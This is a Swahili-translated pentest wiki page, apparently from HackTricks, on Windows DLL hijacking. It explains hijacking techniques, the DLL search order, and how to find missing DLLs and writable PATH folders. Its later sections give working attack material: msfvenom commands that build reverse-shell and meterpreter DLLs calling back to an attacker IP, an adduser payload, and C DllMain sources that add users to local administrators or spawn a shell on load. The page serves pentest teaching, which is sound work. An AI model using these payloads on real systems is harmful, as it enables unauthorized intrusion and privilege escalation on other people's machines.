# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la kiwango cha juu lililotengenezwa na hackers, kwa hackers**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata zawadi hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basic Information

DLL Hijacking inahusisha kubadilisha programu inayotambulika ili kupakia DLL mbaya. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Kimsingi inatumika kwa ajili ya utekelezaji wa msimbo, kufikia kudumu, na, kwa kiwango kidogo, kupandisha hadhi. Licha ya kuzingatia kupandisha hadhi hapa, mbinu ya hijacking inabaki kuwa sawa katika malengo.

### Common Techniques

Mbinu kadhaa zinatumika kwa DLL hijacking, kila moja ikiwa na ufanisi wake kulingana na mkakati wa upakiaji wa DLL wa programu:

1. **DLL Replacement**: Kubadilisha DLL halisi na moja mbaya, kwa hiari kutumia DLL Proxying ili kuhifadhi kazi ya DLL ya asili.
2. **DLL Search Order Hijacking**: Kuweka DLL mbaya katika njia ya utafutaji kabla ya ile halali, ikitumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL mbaya kwa programu kupakia, ikidhani ni DLL inayohitajika isiyopo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama vile `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza programu kwa DLL mbaya.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na sawa mbaya katika saraka ya WinSxS, mbinu ambayo mara nyingi inahusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL mbaya katika saraka inayodhibitiwa na mtumiaji iliyo na programu iliyokopwa, ikifanana na mbinu za Binary Proxy Execution.

## Finding missing Dlls

Njia ya kawaida zaidi ya kupata Dlls zinazokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kuiweka** **filta 2 zifuatazo**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

na kuonyesha tu **Shughuli za Mfumo wa Faili**:

![](<../../images/image (314).png>)

Ikiwa unatafuta **dll zinazokosekana kwa ujumla** unapaswa **kuacha** hii ikifanya kazi kwa **sekunde** chache.\
Ikiwa unatafuta **dll inayokosekana ndani ya executable maalum** unapaswa kuweka **filta nyingine kama "Jina la Mchakato" "linajumuisha" "\<jina la exec>", kuendesha, na kusitisha kukamata matukio**.

## Exploiting Missing Dlls

Ili kupandisha hadhi, nafasi bora tuliyonayo ni kuwa na uwezo wa **kuandika dll ambayo mchakato wa hadhi utajaribu kupakia** katika moja ya **mahali ambapo itatafutwa**. Hivyo, tutakuwa na uwezo wa **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll ya asili** iko (kesi ya ajabu), au tutakuwa na uwezo wa **kuandika katika folda fulani ambapo dll itatafutwa** na **dll ya asili haipo** katika folda yoyote.

### Dll Search Order

**Ndani ya** [**nyaraka za Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata jinsi Dlls zinavyopakiwa kwa usahihi.**

**Programu za Windows** hutafuta DLLs kwa kufuata seti ya **njia za utafutaji zilizowekwa awali**, zikizingatia mpangilio maalum. Tatizo la DLL hijacking linatokea wakati DLL mbaya imewekwa kimkakati katika moja ya saraka hizi, kuhakikisha inapata kupakiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia njia za moja kwa moja inaporejelea DLLs inazohitaji.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. Saraka ambayo programu ilipakia.
2. Saraka ya mfumo. Tumia [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kazi kupata njia ya saraka hii.(_C:\Windows\System32_)
3. Saraka ya mfumo ya 16-bit. Hakuna kazi inayopata njia ya saraka hii, lakini inatafutwa. (_C:\Windows\System_)
4. Saraka ya Windows. Tumia [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kazi kupata njia ya saraka hii.
1. (_C:\Windows_)
5. Saraka ya sasa.
6. Saraka ambazo ziko kwenye mabadiliko ya mazingira ya PATH. Kumbuka kuwa hii haijumuishi njia ya kila programu iliyotajwa na funguo za rejista za **App Paths**. Funguo za **App Paths** hazitumiki wakati wa kuhesabu njia ya utafutaji wa DLL.

Huu ndio **mpangilio wa kawaida** wa utafutaji na **SafeDllSearchMode** imewezeshwa. Wakati imezimwa, saraka ya sasa inapaa hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** thamani ya rejista na uweke kuwa 0 (kawaida imewezeshwa).

Ikiwa kazi ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** utafutaji huanza katika saraka ya moduli ya executable ambayo **LoadLibraryEx** inakabili.

Hatimaye, kumbuka kuwa **dll inaweza kupakiwa ikionyesha njia kamili badala ya jina tu**. Katika kesi hiyo, dll hiyo **itaweza kutafutwa tu katika njia hiyo** (ikiwa dll ina utegemezi wowote, zitatafutwa kama zilivyojulikana kwa jina).

Kuna njia nyingine za kubadilisha njia za kubadilisha mpangilio wa utafutaji lakini sitazielezea hapa.

#### Exceptions on dll search order from Windows docs

Mambo fulani ya kipekee kwa mpangilio wa kawaida wa utafutaji wa DLL yanatajwa katika nyaraka za Windows:

- Wakati **DLL inayoshiriki jina lake na moja ambayo tayari imepakiwa kwenye kumbukumbu** inakutana, mfumo hupita utafutaji wa kawaida. Badala yake, inafanya ukaguzi wa kuelekeza na manifest kabla ya kurudi kwa DLL ambayo tayari iko kwenye kumbukumbu. **Katika hali hii, mfumo haufanyi utafutaji wa DLL**.
- Katika kesi ambapo DLL inatambuliwa kama **DLL inayojulikana** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la DLL inayojulikana, pamoja na yoyote ya DLLs zake zinazotegemea, **bila kufanya mchakato wa utafutaji**. Funguo ya rejista **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya hizi DLLs zinazojulikana.
- Ikiwa **DLL ina utegemezi**, utafutaji wa hizi DLLs zinazotegemea unafanywa kana kwamba zilionyeshwa tu kwa **majina ya moduli zao**, bila kujali ikiwa DLL ya awali ilitambuliwa kupitia njia kamili.

### Escalating Privileges

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **hadhi tofauti** (harakati za usawa au za pembeni), ambayo **haina DLL**.
- Hakikisha **ufikiaji wa kuandika** upo kwa **saraka yoyote** ambayo **DLL** itatafutwa. Mahali hapa inaweza kuwa saraka ya executable au saraka ndani ya njia ya mfumo.

Ndio, mahitaji ni magumu kupatikana kwani **kwa kawaida ni ajabu kupata executable yenye hadhi ikikosekana dll** na ni **ajabu zaidi kuwa na ruhusa za kuandika kwenye folda ya njia ya mfumo** (huwezi kwa kawaida). Lakini, katika mazingira yasiyo sahihi, hii inawezekana.\
Katika kesi umebahatika na unakutana na mahitaji, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni kupita UAC**, unaweza kupata huko **PoC** ya Dll hijacking kwa toleo la Windows ambalo unaweza kutumia (labda tu kubadilisha njia ya folda ambapo una ruhusa za kuandika).

Kumbuka kuwa unaweza **kuangalia ruhusa zako katika folda** ukifanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia uagizaji wa executable na uuzaji wa dll kwa:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili juu ya jinsi ya **kudhulumu Dll Hijacking ili kupandisha mamlaka** na ruhusa za kuandika katika **folda ya Njia ya Mfumo** angalia:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Zana za Kiotomatiki

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itakagua ikiwa una ruhusa za kuandika kwenye folda yoyote ndani ya mfumo PATH.\
Zana nyingine za kiotomatiki zinazovutia kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Iwapo utapata hali inayoweza kutumiwa, moja ya mambo muhimu ili kufanikiwa kuitumia ni **kuunda dll inayosafirisha angalau kazi zote ambazo executable itazipata kutoka kwake**. Hata hivyo, kumbuka kwamba Dll Hijacking inakuwa na manufaa ili [kupandisha kutoka Kiwango cha Uaminifu wa Kati hadi Juu **(kupita UAC)**](../authentication-credentials-uac-and-efs.md#uac) au kutoka [**Kiwango cha Juu hadi SYSTEM**](./#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa dll hijacking ulioangazia dll hijacking kwa utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **misimbo ya msingi ya dll** ambayo inaweza kuwa na manufaa kama **mifano** au kuunda **dll yenye kazi zisizohitajika zilizofichwa**.

## **Kuunda na kukusanya Dlls**

### **Dll Proxifying**

Kimsingi **Dll proxy** ni Dll inayoweza **kutekeleza msimbo wako mbaya unapopakuliwa** lakini pia **kuonyesha** na **kufanya kazi** kama **ilivyotarajiwa** kwa **kupeleka simu zote kwa maktaba halisi**.

Kwa zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kwa kweli **kuashiria executable na kuchagua maktaba** unayotaka kuproxify na **kuunda dll iliyoprosify** au **kuashiria Dll** na **kuunda dll iliyoprosify**.

### **Meterpreter**

**Pata rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuona toleo la x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika kesi kadhaa Dll unayoandika lazima **iweke nje kazi kadhaa** ambazo zitakuwa zikipakiwa na mchakato wa mwathirika, ikiwa kazi hizi hazipo **binafsi haitakuwa na uwezo wa kupakia** na **shambulio litashindwa**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Marejeo

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Usanidi wa bug bounty**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la kiwango cha juu lililotengenezwa na hackers, kwa hackers**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na uanze kupata zawadi hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
